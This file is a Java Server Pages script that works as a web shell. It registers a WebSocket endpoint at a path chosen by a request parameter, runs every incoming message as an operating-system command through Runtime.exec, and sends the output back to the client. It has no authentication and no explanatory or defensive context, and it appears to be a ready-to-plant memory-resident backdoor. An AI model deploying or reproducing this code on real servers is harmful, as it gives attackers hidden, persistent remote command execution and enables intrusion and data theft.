<%@ page import="javax.websocket.server.ServerEndpointConfig" %>
<%@ page import="javax.websocket.server.ServerContainer" %>
<%@ page import="javax.websocket.*" %>
<%@ page import="java.io.*" %>
<%!
    public static class x extends Endpoint {
        @Override
        public void onOpen(Session session, EndpointConfig config) {
            session.addMessageHandler(new MessageHandler.Partial<String>() {
                @Override
                public void onMessage(String s, boolean ccc) {
                    if (s !=null){
                        String out;
                        try {
                            Runtime rt = Runtime.getRuntime();
                            Process p = rt.exec(s);
                            InputStream inputStream = p.getInputStream();
                            BufferedReader b = new BufferedReader(new InputStreamReader(inputStream));
                            StringBuilder all = new StringBuilder();
                            String line;
                            while ((line = b.readLine()) != null) {
                                all.append(line).append("\n");
                            }
                            out = all.toString();
                        } catch (Exception e) {
                            out = e.toString();
                        }
                        try {
                            session.getBasicRemote().sendText(out);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }
            });
        }
    }
%>
<%
    ServletContext servletContext = request.getSession().getServletContext();
    ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(x.class, request.getParameter("path")).build();
    ServerContainer container = (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
    try {
        container.addEndpoint(configEndpoint);
    } catch (DeploymentException e) {
        e.printStackTrace();
    }
%>